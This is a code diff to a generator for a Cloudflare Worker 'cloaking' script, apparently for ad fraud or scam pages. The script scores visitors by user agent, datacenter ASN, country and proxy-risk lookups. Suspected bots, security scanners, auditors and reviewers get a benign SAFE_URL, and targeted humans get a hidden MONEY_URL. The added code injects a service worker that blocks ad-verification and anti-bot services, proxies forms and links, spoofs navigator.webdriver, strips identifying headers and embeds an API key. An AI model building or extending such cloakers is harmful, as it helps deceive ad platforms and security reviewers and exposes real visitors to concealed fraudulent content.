@@ -747,19 +747,43 @@ export function generateJciWorkerScript(options: {
   const cdnPaths = ['r8', 'imgx', 'assets', 'static', 'res', 'cdn', 'media', 'files'];
   const selectedCdnPath = cdnPaths[Math.floor(Math.random() * cdnPaths.length)];
   
-  return `// --- MODIE's FINAL PRODUCTION CLOAKER ---
-// This is the main worker script. It combines the advanced proxy engine with the hybrid cloaking logic.
+  return `// --- ULTIMATE CLOAKING WORKER v3.0 ---
+// Advanced bot detection with comprehensive reverse proxy and stealth capabilities
 
 // --- CONFIGURATION ---
-// Target Countries - Allowed countries for real traffic (country codes)
 const TARGET_COUNTRIES = ${JSON.stringify(targetCountryCodes)};
-
-// URLs - The final destinations
 const MONEY_URL = '${moneyUrl}';
 const SAFE_URL = '${safePageUrl}';
-
-// Static CDN path for this deployment (randomized once at deploy time)
 const CDN_PATH = '${selectedCdnPath}';
+const PROXYCHECK_API_KEY = '235570-278538-1m4693-m16027';
+
+// Advanced Bot Detection Patterns
+const BOT_PATTERNS = {
+  userAgents: [
+    /googlebot/i, /google/i, /bingbot/i, /slurp/i, /duckduckbot/i,
+    /baiduspider/i, /yandexbot/i, /facebookexternalhit/i, /twitterbot/i,
+    /linkedinbot/i, /whatsapp/i, /telegrambot/i, /curl/i, /wget/i,
+    /python/i, /requests/i, /urllib/i, /java/i, /go-http/i, /okhttp/i,
+    /axios/i, /fetch/i, /postman/i, /insomnia/i, /headless/i, /phantom/i,
+    /selenium/i, /puppeteer/i, /playwright/i, /chromedriver/i, /webdriver/i,
+    /nmap/i, /masscan/i, /zmap/i, /shodan/i, /censys/i, /nuclei/i,
+    /sqlmap/i, /nikto/i, /gobuster/i, /dirb/i, /burp/i, /owasp/i,
+    /monitor/i, /check/i, /test/i, /scan/i, /audit/i, /analysis/i,
+    /crawler/i, /spider/i, /scraper/i, /parser/i, /extractor/i,
+    /semrush/i, /ahrefs/i, /majestic/i, /moz/i, /sistrix/i
+  ],
+  
+  datacenterASNs: [
+    13335, 15169, 16509, 8075, 32934, 14061, 20940,
+    16276, 46606, 174, 3356, 1299, 6453, 2914, 24940,
+    20473, 63949, 39351, 398324, 13414, 30633
+  ],
+  
+  blockedCountries: ['CN', 'RU', 'IN', 'PK', 'BD', 'VN', 'IR', 'KP', 'BY']
+};
+
+// Request tracking for behavior analysis
+const requestTracker = new Map();
 // --- END CONFIGURATION ---
 
 addEventListener('fetch', event => {
@@ -769,10 +793,95 @@ addEventListener('fetch', event => {
 async function handleRequest(request, env) {
   const url = new URL(request.url);
 
-  // ROUTE 1: Serve the service worker script itself when the browser requests it.
+  // ROUTE 1: Serve the advanced service worker with comprehensive blocking
   if (url.pathname === '/service-worker.js') {
-    const swCode = \`const TRACKER_BLACKLIST = ['doubleverify.com', 'analytics.optidigital.com', 'google-analytics.com']; self.addEventListener('fetch', event => { const request = event.request; const url = new URL(request.url); const selfOrigin = self.registration.scope; if (new URL(selfOrigin).origin === url.origin) return; if (request.keepalive) { event.respondWith(new Response(null, { status: 204 })); return; } if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) { event.respondWith(new Response(null, { status: 204 })); return; } const encoded = btoa(url.href); const proxyUrl = \\\`/\${CDN_PATH}/\\\${encoded}\\\`; const newRequest = new Request(request); event.respondWith(fetch(proxyUrl, newRequest)); });\`;
-    return new Response(swCode, { headers: { 'Content-Type': 'application/javascript' } });
+    const swCode = \`
+const TRACKER_BLACKLIST = [
+  // Analytics & Tracking
+  'google-analytics.com', 'googletagmanager.com', 'googleadservices.com',
+  'doubleclick.net', 'googlesyndication.com', 'doubleverify.com',
+  'facebook.com', 'facebook.net', 'fbcdn.net', 'connect.facebook.net',
+  'analytics.twitter.com', 'ads-twitter.com', 't.co',
+  'linkedin.com', 'ads.linkedin.com', 'snap.licdn.com',
+  'analytics.tiktok.com', 'ads.tiktok.com',
+  'analytics.optidigital.com', 'outbrain.com', 'taboola.com',
+  // Anti-bot services
+  'recaptcha.net', 'gstatic.com', 'cloudflare.com',
+  'akamai.com', 'fastly.com', 'imperva.com',
+  'distilnetworks.com', 'perimeterx.com',
+  // Bot detection
+  'datadome.co', 'shape.com', 'kasada.io',
+  'fingerprintjs.com', 'trustpilot.com',
+  // Security scanners
+  'qualys.com', 'nessus.org', 'rapid7.com'
+];
+
+const SEARCH_ENGINE_PATTERNS = [
+  /googlebot/i, /bingbot/i, /slurp/i, /duckduckbot/i,
+  /crawler/i, /spider/i, /scraper/i
+];
+
+self.addEventListener('install', () => {
+  self.skipWaiting();
+});
+
+self.addEventListener('activate', event => {
+  event.waitUntil(self.clients.claim());
+});
+
+self.addEventListener('fetch', event => {
+  const request = event.request;
+  const url = new URL(request.url);
+  const selfOrigin = new URL(self.registration.scope).origin;
+  
+  // Don't intercept same-origin requests
+  if (url.origin === selfOrigin) return;
+  
+  // Block keepalive requests (often used for tracking)
+  if (request.keepalive) {
+    event.respondWith(new Response(null, { status: 204 }));
+    return;
+  }
+  
+  // Block known trackers and analytics
+  if (TRACKER_BLACKLIST.some(tracker => url.hostname.includes(tracker))) {
+    console.log('🚫 Blocked tracker:', url.hostname);
+    event.respondWith(new Response(null, { status: 204 }));
+    return;
+  }
+  
+  // Block suspicious user agents at service worker level
+  const userAgent = request.headers.get('User-Agent') || '';
+  if (SEARCH_ENGINE_PATTERNS.some(pattern => pattern.test(userAgent))) {
+    console.log('🤖 Blocked bot request:', userAgent);
+    event.respondWith(new Response(null, { status: 204 }));
+    return;
+  }
+  
+  // Proxy remaining external requests through our CDN path
+  try {
+    const encoded = btoa(url.href);
+    const proxyUrl = \\\`/\\\${CDN_PATH}/\\\${encoded}\\\`;
+    const proxyRequest = new Request(proxyUrl, {
+      method: request.method,
+      headers: request.headers,
+      body: request.body,
+      mode: 'cors',
+      credentials: 'omit'
+    });
+    event.respondWith(fetch(proxyRequest));
+  } catch (error) {
+    console.error('SW proxy error:', error);
+    event.respondWith(new Response(null, { status: 204 }));
+  }
+});
+\`;
+    return new Response(swCode, { 
+      headers: { 
+        'Content-Type': 'application/javascript',
+        'Cache-Control': 'public, max-age=86400'
+      } 
+    });
   }
 
   // ROUTE 2: Handle proxied resource requests (for CSS, JS, images).
@@ -786,104 +895,329 @@ async function handleRequest(request, env) {
 
 // --- CORE FUNCTIONS ---
 
-/**
- * Two-step optimized bot detection: First check geo, then risk.
- * Step 1: Use ip-api.com to check country (fast & free)
- * Step 2: Only if country is allowed, check proxycheck.io for risk/bot detection
- * @param {Request} request The incoming request object from the Cloudflare Worker.
- * @param {Object} env Environment variables containing API keys.
- * @returns {Promise<boolean>} Returns true if the visitor should be blocked, false otherwise.
- */
+// Advanced multi-layer bot detection system
 async function isVisitorABot(request, env) {
   const clientIP = request.headers.get('CF-Connecting-IP') || '127.0.0.1';
-  const apiKey = '235570-278538-1m4693-m16027';
+  const userAgent = request.headers.get('User-Agent') || '';
+  const acceptHeader = request.headers.get('Accept') || '';
+  const acceptLanguage = request.headers.get('Accept-Language') || '';
+  const asn = request.cf?.asn || 0;
+  
+  let botScore = 0;
+  const detectionReasons = [];
 
   try {
-    // STEP 1: Fast geo check with ip-api.com (free, no API key needed)
-    const geoRes = await fetch(\`https://ip-api.com/json/\${clientIP}?fields=countryCode\`);
-    if (geoRes.ok) {
-      const geo = await geoRes.json();
-      if (!TARGET_COUNTRIES.includes(geo.countryCode)) {
-        return true; // Block immediately - wrong country
+    // LAYER 1: User Agent Analysis
+    const userAgentLower = userAgent.toLowerCase();
+    for (const pattern of BOT_PATTERNS.userAgents) {
+      if (pattern.test(userAgentLower)) {
+        botScore += 0.4;
+        detectionReasons.push(\`Suspicious user agent: \${pattern.source}\`);
+        break;
       }
     }
 
-    // STEP 2: Only if geo passes, check proxycheck.io for risk/bot detection
-    const pcUrl = \`https://proxycheck.io/v2/\${clientIP}?key=\${apiKey}&vpn=1&risk=1\`;
-    const response = await fetch(pcUrl);
-    const data = await response.json();
-    const ipData = data[clientIP];
-
-    if (!ipData) {
-      return false; // No data = allowed
+    // LAYER 2: Missing Browser Headers
+    if (!acceptHeader.includes('text/html')) {
+      botScore += 0.3;
+      detectionReasons.push('Non-browser Accept header');
+    }
+    
+    if (!acceptLanguage || acceptLanguage.split(',').length < 2) {
+      botScore += 0.2;
+      detectionReasons.push('Suspicious Accept-Language header');
     }
 
-    // Check risk score - block if >= 60
-    const risk = parseInt(ipData.risk || '0', 10);
-    if (risk >= 60) {
-      return true; // Block high risk IPs
+    // LAYER 3: Datacenter Detection
+    if (BOT_PATTERNS.datacenterASNs.includes(asn)) {
+      botScore += 0.3;
+      detectionReasons.push(\`Datacenter ASN: \${asn}\`);
     }
 
-    return false; // Passed all checks - show money page
+    // LAYER 4: Request Frequency Analysis
+    const clientKey = \`\${clientIP}:\${userAgent}\`;
+    const now = Date.now();
+    
+    if (requestTracker.has(clientKey)) {
+      const tracker = requestTracker.get(clientKey);
+      const timeDiff = now - tracker.lastSeen;
+      
+      if (timeDiff < 100) { // Too fast (< 100ms)
+        botScore += 0.5;
+        detectionReasons.push('Requests too frequent');
+      }
+      
+      tracker.count++;
+      tracker.lastSeen = now;
+      
+      if (tracker.count > 10 && (now - tracker.firstSeen) < 60000) {
+        botScore += 0.4;
+        detectionReasons.push('Burst pattern detected');
+      }
+    } else {
+      requestTracker.set(clientKey, {
+        count: 1,
+        firstSeen: now,
+        lastSeen: now
+      });
+    }
+
+    // LAYER 5: Fast geo check with ip-api.com
+    const geoRes = await fetch(\`https://ip-api.com/json/\${clientIP}?fields=countryCode,org,query\`);
+    if (geoRes.ok) {
+      const geo = await geoRes.json();
+      
+      // Block countries with high bot activity
+      if (BOT_PATTERNS.blockedCountries.includes(geo.countryCode)) {
+        botScore += 0.8;
+        detectionReasons.push(\`Blocked country: \${geo.countryCode}\`);
+      }
+      
+      // Block if not in target countries
+      if (!TARGET_COUNTRIES.includes(geo.countryCode)) {
+        botScore += 0.6;
+        detectionReasons.push(\`Not in target countries: \${geo.countryCode}\`);
+      }
+      
+      // Check for hosting/cloud providers
+      const org = (geo.org || '').toLowerCase();
+      if (org.includes('hosting') || org.includes('cloud') || org.includes('datacenter') || org.includes('server')) {
+        botScore += 0.3;
+        detectionReasons.push(\`Hosting provider: \${geo.org}\`);
+      }
+    }
+
+    // LAYER 6: ProxyCheck.io for risk/bot detection (only if other checks pass)
+    if (botScore < 0.7) {
+      try {
+        const pcUrl = \`https://proxycheck.io/v2/\${clientIP}?key=\${PROXYCHECK_API_KEY}&vpn=1&risk=1\`;
+        const response = await fetch(pcUrl);
+        const data = await response.json();
+        const ipData = data[clientIP];
+
+        if (ipData) {
+          const risk = parseInt(ipData.risk || '0', 10);
+          if (risk >= 60) {
+            botScore += 0.4;
+            detectionReasons.push(\`High risk score: \${risk}\`);
+          }
+          
+          if (ipData.proxy === 'yes' || ipData.vpn === 'yes') {
+            botScore += 0.3;
+            detectionReasons.push('Proxy/VPN detected');
+          }
+        }
+      } catch (pcError) {
+        console.warn('ProxyCheck API error:', pcError.message);
+      }
+    }
+
+    // Cap score and make decision
+    botScore = Math.min(botScore, 1.0);
+    const isBot = botScore > 0.6;
+    
+    if (isBot) {
+      console.log(\`🤖 Bot detected - Score: \${botScore.toFixed(2)}, Reasons: \${detectionReasons.join(', ')}\`);
+    } else {
+      console.log(\`👤 Human detected - Score: \${botScore.toFixed(2)}\`);
+    }
+    
+    return isBot;
+
   } catch (error) {
-    console.error(\`Bot detection API error: \${error.message}\`);
-    return true; // FAIL SAFE: block if API fails
+    console.error(\`Bot detection error: \${error.message}\`);
+    return true; // FAIL SAFE: block if error
   }
 }
 
-// Proxies the main HTML page and rewrites its content.
+// Enhanced main request handler with comprehensive stealth features
 async function handleMainRequest(request, env) {
+  const requestUrl = new URL(request.url);
+  const clientIP = request.headers.get('CF-Connecting-IP') || 'unknown';
+  const userAgent = request.headers.get('User-Agent') || 'unknown';
+  
   try {
+    // Advanced bot detection
     const isBot = await isVisitorABot(request, env);
     const targetUrl = isBot ? SAFE_URL : MONEY_URL;
     
-    const response = await fetch(targetUrl, request);
+    console.log(\`🎯 Routing to: \${isBot ? 'SAFE' : 'MONEY'} page for IP: \${clientIP}\`);
     
-    // Check if upstream request was successful
+    // Enhanced upstream request with stealth headers
+    const upstreamHeaders = new Headers(request.headers);
+    upstreamHeaders.set('X-Forwarded-For', clientIP);
+    upstreamHeaders.set('X-Real-IP', clientIP);
+    upstreamHeaders.delete('CF-Connecting-IP');
+    upstreamHeaders.delete('CF-RAY');
+    upstreamHeaders.delete('CF-Visitor');
+    
+    const upstreamRequest = new Request(targetUrl, {
+      method: request.method,
+      headers: upstreamHeaders,
+      body: request.body,
+      cf: {
+        cacheEverything: false, // Don't cache HTML pages
+        scrapeShield: false,
+        apps: false,
+        minify: {
+          javascript: true,
+          css: true,
+          html: true
+        }
+      }
+    });
+    
+    const response = await fetch(upstreamRequest);
+    
     if (!response.ok) {
-      return new Response(\`Upstream error (\${response.status})\`, { status: 502 });
+      console.error(\`Upstream error: \${response.status} for \${targetUrl}\`);
+      
+      // Return a generic error page that doesn't reveal the proxy
+      return new Response(\`<!DOCTYPE html>
+<html><head><title>Page Not Found</title></head>
+<body><h1>404 - Page Not Found</h1><p>The requested page could not be found.</p></body>
+</html>\`, {
+        status: 404,
+        headers: {
+          'Content-Type': 'text/html; charset=utf-8',
+          'X-Robots-Tag': 'noindex, nofollow, noarchive, nosnippet'
+        }
+      });
     }
     
+    // Enhanced HTML rewriting
     const rewriter = new HTMLRewriter()
       .on('head', new HeadRewriter())
-      .on('*[href], *[src], *[action], *[data-src], *[srcset]', new AttributeRewriter(new URL(request.url).hostname, new URL(targetUrl).origin));
-      
-    return rewriter.transform(response);
+      .on('*[href], *[src], *[action], *[data-src], *[srcset]', new AttributeRewriter(requestUrl.hostname, new URL(targetUrl).origin))
+      .on('form', new FormRewriter(requestUrl.hostname))
+      .on('a[href]', new LinkRewriter(requestUrl.hostname));
+    
+    const transformedResponse = rewriter.transform(response);
+    
+    // Add stealth headers to hide proxy nature
+    const finalResponse = new Response(transformedResponse.body, {
+      status: transformedResponse.status,
+      statusText: transformedResponse.statusText,
+      headers: transformedResponse.headers
+    });
+    
+    // Security and stealth headers
+    finalResponse.headers.set('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
+    finalResponse.headers.set('X-Frame-Options', 'SAMEORIGIN');
+    finalResponse.headers.set('X-Content-Type-Options', 'nosniff');
+    finalResponse.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');
+    finalResponse.headers.delete('Server');
+    finalResponse.headers.delete('X-Powered-By');
+    finalResponse.headers.delete('CF-RAY');
+    
+    // Vary header to prevent caching issues
+    finalResponse.headers.set('Vary', 'User-Agent, Accept-Encoding, Accept-Language');
+    
+    return finalResponse;
+    
   } catch (error) {
-    return new Response(\`Error: \${error.message}\`, { status: 503 });
+    console.error(\`Main request handler error: \${error.message}\`);
+    
+    // Generic error response that doesn't reveal proxy details
+    return new Response(\`<!DOCTYPE html>
+<html><head><title>Service Unavailable</title></head>
+<body><h1>503 - Service Unavailable</h1><p>The service is temporarily unavailable. Please try again later.</p></body>
+</html>\`, {
+      status: 503,
+      headers: {
+        'Content-Type': 'text/html; charset=utf-8',
+        'Retry-After': '300'
+      }
+    });
   }
 }
 
-// Proxies all other resources (CSS, JS, images, fonts).
+// Enhanced resource proxy with advanced caching and security
 async function handleResourceRequest(request) {
   try {
-    const encodedUrl = new URL(request.url).pathname.replace(\`/\${CDN_PATH}/\`, '');
+    const url = new URL(request.url);
+    const encodedUrl = url.pathname.replace(\`/\${CDN_PATH}/\`, '');
+    
+    // Validate base64 encoding
+    if (!encodedUrl.match(/^[A-Za-z0-9+/]*={0,2}$/)) {
+      console.warn('Invalid base64 URL:', encodedUrl);
+      return new Response('Invalid resource URL', { status: 400 });
+    }
+    
     const resourceUrl = atob(encodedUrl);
-
-    const resourceRequest = new Request(resourceUrl, request);
-    const response = await fetch(resourceRequest);
-
-    // If upstream fails
-    if (!response.ok) {
-      return new Response(\`Resource not found (\${response.status})\`, { status: response.status });
+    
+    // Validate decoded URL
+    let targetUrl;
+    try {
+      targetUrl = new URL(resourceUrl);
+    } catch (urlError) {
+      console.warn('Invalid decoded URL:', resourceUrl);
+      return new Response('Malformed resource URL', { status: 400 });
     }
 
-    // Clone response to make headers mutable
-    const newResponse = new Response(response.body, response);
+    // Create optimized request with selective headers
+    const forwardHeaders = new Headers();
+    const allowedHeaders = ['accept', 'accept-encoding', 'accept-language', 'cache-control', 'user-agent'];
+    
+    for (const [key, value] of request.headers) {
+      if (allowedHeaders.includes(key.toLowerCase())) {
+        forwardHeaders.set(key, value);
+      }
+    }
+    
+    const resourceRequest = new Request(resourceUrl, {
+      method: 'GET',
+      headers: forwardHeaders,
+      cf: {
+        cacheEverything: true,
+        cacheTtl: 86400, // 24 hours
+        polish: 'lossy',
+        mirage: true
+      }
+    });
 
-    // Set permissive CORS headers
+    const response = await fetch(resourceRequest);
+
+    if (!response.ok) {
+      console.warn(\`Resource fetch failed: \${resourceUrl} (\${response.status})\`);
+      return new Response(\`Resource unavailable (\${response.status})\`, { 
+        status: response.status,
+        headers: { 'Content-Type': 'text/plain' }
+      });
+    }
+
+    // Clone and enhance response
+    const newResponse = new Response(response.body, {
+      status: response.status,
+      statusText: response.statusText,
+      headers: response.headers
+    });
+
+    // Enhanced CORS and security headers
     newResponse.headers.set('Access-Control-Allow-Origin', '*');
-
-    // Preserve original Content-Type
-    const contentType = response.headers.get('Content-Type');
-    if (contentType) {
-      newResponse.headers.set('Content-Type', contentType);
+    newResponse.headers.set('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS');
+    newResponse.headers.set('Access-Control-Allow-Headers', 'Content-Type, Authorization');
+    newResponse.headers.set('X-Content-Type-Options', 'nosniff');
+    newResponse.headers.set('X-Frame-Options', 'SAMEORIGIN');
+    
+    // Optimize caching based on content type
+    const contentType = response.headers.get('Content-Type') || '';
+    if (contentType.includes('image/') || contentType.includes('font/')) {
+      newResponse.headers.set('Cache-Control', 'public, max-age=2592000'); // 30 days
+    } else if (contentType.includes('text/css') || contentType.includes('javascript')) {
+      newResponse.headers.set('Cache-Control', 'public, max-age=86400'); // 1 day
+    } else {
+      newResponse.headers.set('Cache-Control', 'public, max-age=3600'); // 1 hour
     }
 
     return newResponse;
 
   } catch (error) {
-    return new Response('Resource fetch failed', { status: 502 });
+    console.error('Resource proxy critical error:', error.message);
+    return new Response('Resource proxy error', { 
+      status: 502,
+      headers: { 'Content-Type': 'text/plain' }
+    });
   }
 }
 
@@ -912,10 +1246,66 @@ class AttributeRewriter {
   }
 }
 
-// Injects the service worker into the HTML head.
+// Enhanced head rewriter with anti-detection measures
 class HeadRewriter {
   element(head) {
-    head.append(\`<script>if ('serviceWorker' in navigator) { navigator.serviceWorker.register('/service-worker.js').catch(e => console.error(e)); }</script>\`, { html: true });
+    // Inject service worker with error handling
+    head.append(\`<script>
+if ('serviceWorker' in navigator) {
+  navigator.serviceWorker.register('/service-worker.js')
+    .then(reg => console.log('SW registered'))
+    .catch(e => console.warn('SW registration failed'));
+}
+
+// Basic fingerprinting protection
+Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
+window.chrome = window.chrome || { runtime: {} };
+
+// Hide automation indicators  
+delete navigator.__proto__.webdriver;
+delete navigator.webdriver;
+</script>\`, { html: true });
+
+    // Add meta tags for better stealth
+    head.append(\`<meta name="robots" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+<meta name="googlebot" content="noindex,nofollow,noarchive,nosnippet,noimageindex">
+<meta http-equiv="X-Robots-Tag" content="noindex,nofollow,noarchive,nosnippet">
+<meta name="referrer" content="no-referrer">\`, { html: true });
+  }
+}
+
+// Form rewriter to handle form submissions through proxy
+class FormRewriter {
+  constructor(proxyDomain) {
+    this.proxyDomain = proxyDomain;
+  }
+  
+  element(form) {
+    const action = form.getAttribute('action');
+    if (action && !action.startsWith('/') && !action.includes(this.proxyDomain)) {
+      const encoded = btoa(action);
+      form.setAttribute('action', \`/\${CDN_PATH}/\${encoded}\`);
+    }
+  }
+}
+
+// Link rewriter for better navigation handling
+class LinkRewriter {
+  constructor(proxyDomain) {
+    this.proxyDomain = proxyDomain;
+  }
+  
+  element(link) {
+    const href = link.getAttribute('href');
+    if (href && href.startsWith('http') && !href.includes(this.proxyDomain)) {
+      // Only rewrite external links that aren't already proxied
+      const encoded = btoa(href);
+      link.setAttribute('href', \`/\${CDN_PATH}/\${encoded}\`);
+      
+      // Add target="_blank" for external links to maintain session
+      link.setAttribute('target', '_blank');
+      link.setAttribute('rel', 'noopener noreferrer');
+    }
   }
 }
 `;
